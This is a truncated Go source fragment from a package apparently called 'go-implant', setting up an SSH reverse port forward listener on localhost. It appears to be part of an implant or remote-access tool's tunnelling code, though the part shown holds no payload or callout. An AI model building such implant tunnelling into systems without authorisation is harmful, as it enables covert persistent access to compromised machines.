// +build !windows

// is this needed???

package ssh

import (
	"go-implant/client/config"
	"fmt"
	"io"
	"log"
	"net"

	"github.com/fatih/color"
	"golang.org/x/crypto/ssh"
)

type tcpIPForwardRequest struct {
	AddressToBind    string
	PortNumberToBind uint32
}

func serveReversePortForward(connection ssh.Channel, stopchannel chan struct{}) {

	log.Printf("in serveReversePortForward")

	// don't trust port number from client
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		log.Print(err)
		return
	}

	// spawn goroutine to stop the server when stopchannel gets closed
	go func() {
		<-stopchannel
		listener.Close()
	}()

	// tell user about the tunnel
	color.Set(color.FgGreen)
	l